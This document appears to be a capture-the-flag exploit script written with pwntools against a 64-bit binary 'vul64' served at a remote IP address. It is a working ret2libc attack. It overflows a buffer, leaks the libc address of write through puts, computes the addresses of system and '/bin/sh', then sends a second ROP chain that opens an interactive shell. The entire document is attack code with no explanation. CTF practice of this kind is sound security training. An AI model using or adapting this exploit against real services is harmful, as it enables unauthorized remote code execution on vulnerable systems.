#!/usr/bin/env python
from pwn import *

#context.log_level='debug'
#io = process(("./vul64"))
io =remote('202.112.51.154',20002)
#gdb.attach(io,'b *0x40084d')
elf = ELF("./vul64")
libc = ELF("libc.so.6")
num = 51 
pop_rdi_addr = 0x0000000000400933 #pop rdi ; ret
pop_rsi_addr = 0x0000000000400931 # pop rsi ; pop r15 ; ret


payload = num * 'a'+'\x47'
'''

payload += p64(pop_rdi_addr)
payload += p64(1)

payload += p64(pop_rsi_addr)        
payload += p64(elf.got['write'])  #rsi      
payload += p64(0)   #r15

payload += p64(elf.plt['write'])
payload += p64(elf.symbols['main'])  
'''


payload += p64(pop_rdi_addr)
payload += p64(elf.got['write'])

payload += p64(elf.plt['puts'])
payload += p64(elf.symbols['main']) 


io.sendline(payload)

data = io.recvline() # Plz input
print data
data = io.recvline() # a
print data
data = io.recv(6)
print data

write_addr = u64(data+"\x00\x00")

print "write_addr:"+ hex(write_addr)

wirte_offset = libc.symbols['write']
system_offset = libc.symbols['system']
bin_sh_offset = next(libc.search('/bin/sh'))
libc_base = write_addr -wirte_offset
system_addr = libc_base + system_offset
bin_sh_addr = libc_base + bin_sh_offset
print "system_addr:"+hex(system_addr)
print "bin_sh_addr:"+hex(bin_sh_addr)
sleep(2)
payload2 = 'a'*num + '\x47'
#payload2 += p64(-1)
payload2 += p64(pop_rdi_addr)
payload2 += p64(bin_sh_addr)
payload2 += p64(system_addr)
#print payload2
io.sendline(payload2)
io.interactive()





